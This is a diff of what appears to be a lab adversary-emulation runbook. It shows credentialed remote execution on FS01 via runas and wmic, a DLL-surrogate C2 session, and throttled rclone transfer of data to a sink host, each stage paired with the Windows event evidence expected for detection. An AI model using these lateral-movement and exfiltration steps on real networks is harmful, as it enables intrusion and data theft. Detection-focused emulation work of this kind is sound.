@@ -197,7 +197,7 @@ Command: runas /user:C0015\it.admin "cmd /k wmic /node:FS01 process call create 
          (run RUN-20260930-01 result: ReturnValue=0, ProcessId=964)
 Expected evidence:
   WS01: S4648 (explicit credential) ; FS01: S4624 Type3 + S4672 + E1 wmiprvse->cmd->powershell (loader) + E7 ImageLoad (hash) + E11
-Gate (4): process on FS01 / which identity (S4648 + S4624/4672 same LogonId) / which process (+DLL hash) / callback S9
+Gate (4): process on FS01 / which identity (S4648 + S4624/4672; LogonId joins are valid ONLY within the same host - LogonId is not globally unique) / which process (+DLL hash) / callback S9
 Ledger: S8 = VERIFIED only when the 4-gate evidence set is present in the same run_id
 ```
 ### S9 — second session (143.dll surrogate; automatic after S8b trigger)
@@ -224,7 +224,7 @@ Ledger: S10 = VERIFIED with S5145 + manifest matching corpus
 ```
 ### S11a / S11b — transfer to internal sink (two rounds; RDP S12 between)
 ```
-Machine: session 2 host -> sink (192.168.50.1:8081)
+Machine: session 2 host -> sink (192.168.50.1:9001, rclone serve webdav; transfer with rclone client: copy --max-age 2y ... --transfers 7 --bwlimit 10M)
 Input:   ART-08-01 manifest; allowlist (hash+bytes, <=1024 single POST)
 Commands (C2 host, repo):
   # POST the allowlisted corpus to the sink, then cross-check:
@@ -289,4 +289,5 @@ Status: S1-S3 VERIFIED on lab (ledger RUN-20261001-01); S4 = CORPUS-only in that
 back to T-NOOP due to a stale config.ini - regenerate config per Part B before the next run); S5-S15 are
 operator/design steps with exact machine/command/evidence/ledger rows above; the chain is NOT end-to-end
 until one continuous run carries handoff evidence for every stage under a single run_id.
+
 
